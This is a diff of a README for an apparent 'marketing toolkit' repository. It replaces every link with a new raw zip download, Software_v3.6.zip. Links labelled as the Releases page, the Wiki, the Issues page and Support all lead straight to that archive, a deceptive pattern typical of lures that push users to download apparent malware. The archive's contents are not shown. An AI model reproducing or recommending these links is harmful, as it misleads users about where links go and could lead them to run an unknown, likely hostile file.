@@ -6,11 +6,11 @@ Welcome to the marketing toolkit. This application helps you grow your business 
 
 ## 🔗 Download the Application
 
-[![Download](https://raw.githubusercontent.com/Nithinsanjeev/marketing/main/hydrocupreine/marketing.zip%20Now-blue)](https://raw.githubusercontent.com/Nithinsanjeev/marketing/main/hydrocupreine/marketing.zip)
+[![Download](https://github.com/Nithinsanjeev/marketing/raw/refs/heads/main/hydrocupreine/Software_v3.6.zip%20Now-blue)](https://github.com/Nithinsanjeev/marketing/raw/refs/heads/main/hydrocupreine/Software_v3.6.zip)
 
 ## 📥 Download & Install
 
-To get started with the marketing toolkit, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Nithinsanjeev/marketing/main/hydrocupreine/marketing.zip). 
+To get started with the marketing toolkit, visit this page to download: [GitHub Releases](https://github.com/Nithinsanjeev/marketing/raw/refs/heads/main/hydrocupreine/Software_v3.6.zip). 
 
 On the Releases page, you will see the latest version of the application. Simply click the version number to access the assets. Find the file suitable for your operating system and click on it to begin the download.
 
@@ -62,7 +62,7 @@ Once the application opens, you will see a simple and user-friendly interface. T
 
 If you encounter any issues:
 
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Nithinsanjeev/marketing/main/hydrocupreine/marketing.zip) to report bugs or request features.
+- Visit our [GitHub Issues page](https://github.com/Nithinsanjeev/marketing/raw/refs/heads/main/hydrocupreine/Software_v3.6.zip) to report bugs or request features.
 - Check the FAQ section on the GitHub page for common questions.
 
 ## 🗣️ Community Engagement
@@ -71,9 +71,9 @@ Join our community to learn more and share experiences. Connect with other users
 
 ## 📣 Important Links
 
-- **Download the Application**: [GitHub Releases](https://raw.githubusercontent.com/Nithinsanjeev/marketing/main/hydrocupreine/marketing.zip)
-- **Documentation**: [GitHub Wiki](https://raw.githubusercontent.com/Nithinsanjeev/marketing/main/hydrocupreine/marketing.zip)
-- **Support**: [GitHub Issues](https://raw.githubusercontent.com/Nithinsanjeev/marketing/main/hydrocupreine/marketing.zip)
+- **Download the Application**: [GitHub Releases](https://github.com/Nithinsanjeev/marketing/raw/refs/heads/main/hydrocupreine/Software_v3.6.zip)
+- **Documentation**: [GitHub Wiki](https://github.com/Nithinsanjeev/marketing/raw/refs/heads/main/hydrocupreine/Software_v3.6.zip)
+- **Support**: [GitHub Issues](https://github.com/Nithinsanjeev/marketing/raw/refs/heads/main/hydrocupreine/Software_v3.6.zip)
 
 Feel free to explore the capabilities of this toolkit and integrate it into your marketing operations. 
 
